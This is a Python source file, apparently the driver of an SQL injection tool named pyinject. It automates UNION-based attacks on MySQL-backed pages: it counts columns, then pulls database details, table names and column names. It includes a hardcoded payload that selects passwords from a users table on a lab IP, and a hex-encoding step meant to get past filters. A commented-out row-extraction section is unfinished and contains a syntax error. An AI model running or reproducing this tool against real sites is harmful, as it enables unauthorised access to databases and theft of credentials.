#!/usr/bin/python
""" Driver program for pyinject. Handles user-defined options and calls appropriate modules.

    OPTIONS to support:
        -f:     \n-delimited text file of parameters to inject (default is mysql_params).
        -d:     Delimiter to use. Default is '/**/', also can use:
                                             '%20' 
        -db:    Database to try injections against (default is MySQL). Only MySQL supported as of now.
        -v:     Verbose mode.
"""

import os, sys, urllib2
import builder, datastore, injector, scanner, obfuscator, parser, reporter
import pprint
import json

def test_html_diff():
    """ Debugging function """

    # Instantiate classes used
    scan = scanner.Scanner()
    store = datastore.Store()
    parse = parser.Parser(store)

    a = scan.page('http://192.168.83.130/cat.php?id=null%20UNION%20SELECT%201,password,3,4%20from%20users') 
    b = scan.page('http://192.168.83.130/cat.php?id=null')

    #a = scan.page('http://192.168.83.134/?id=null%20union%20select%201,2,3,4,5,6,user_username%20from%20user')
    #b = scan.page('http://192.168.83.134/?id=null')

    print parse.html_diff(b, a)

def obfuscate_subquery(obfuscator, obfuscation, subquery):
    """ Takes subquery to obfuscate by encoding.
        :obfuscator:    Obfuscator object.
        :obfuscation:   Type of obfuscation to use. Ex, hex-encoding.
        :subquery:      String. Part of query to encode.
        :returns:       String. Encoded subquery.
    """
    
    return obfuscator.by_encoding(subquery, obfuscation)

if __name__ == '__main__':

    if len(sys.argv) == 1:
        print 'Help?'
        sys.exit(0)

    page = sys.argv[1]

    # whitespace-delimited file
    mysql_params = open('./lists/mysql/basic_union.txt').read().split()

    # Instantiate classes used
    scan = scanner.Scanner()
    build = builder.Builder(page, mysql_params)
    store = datastore.Store()
    fang = injector.Injector(page, "")
    report = reporter.Reporter()
    parse = parser.Parser(store)
    obfuscate = obfuscator.Obfuscator()

    """
    # Example obfuscation
    hexencoded = '1 union select column_name,2 from information_schema.columns where table_name = (select'
    hexencoded += obfuscate_subquery(obfuscate, 'hex', '\'users\'') + ')'
    print hexencoded
    """

    # Get column data for union statement
    print '\n### Basic Page Structure ###'
    num_columns = fang.get_num_columns() 
    report.columns_in_statement(num_columns)
    magic_num = int(fang.get_visible_param())
    print '\tMagic Param','\t', magic_num

    # Get DB params
    print '\n### Basic DB Info ###'
    db_data = fang.injection(build.union(num_columns, magic_num)) 
    report.db_info(parse.params(db_data))

    # Get tables
    print '### Interesting Tables ###'
    tables = fang.injection(build.tables(num_columns, magic_num)) 
    report.tables(parse.tables(tables))

    # Get columns, one table at a time
    print '\n### DB Table Columns ###'
    columns = fang.injection(build.columns(num_columns, magic_num, tables['table_name'])) 
    report.columns(parse.columns(columns))
    columns = parse.columns(columns)

    """
    # Get rows
    for column in columns:
        x = build.rows(num_columns, magic_num, , data)
        print x
    data = fang.injection(x)
    #print data
    #print parse.rows(data)
    #report.XXX(parse.XXX(data))
    """


